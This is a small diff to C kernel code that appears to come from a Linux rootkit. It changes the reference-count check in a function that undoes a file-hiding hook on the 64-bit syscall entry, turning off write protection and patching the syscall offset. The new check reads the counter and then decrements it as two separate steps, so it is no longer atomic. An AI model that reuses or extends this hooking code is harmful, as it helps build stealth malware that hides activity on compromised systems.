@@ -73,7 +73,8 @@ hide_files_lstar(void)
 void
 unhide_files_lstar(void)
 {
-    if (atomic_dec_return(&syscall64_install_count) < 1) {
+    if (atomic_read(&syscall64_install_count) == 1) {
+        atomic_dec(&syscall64_install_count);
         disable_protection();
         memcpy((syscall_64_ptr + 1), &old_off, 4);
         enable_protection();
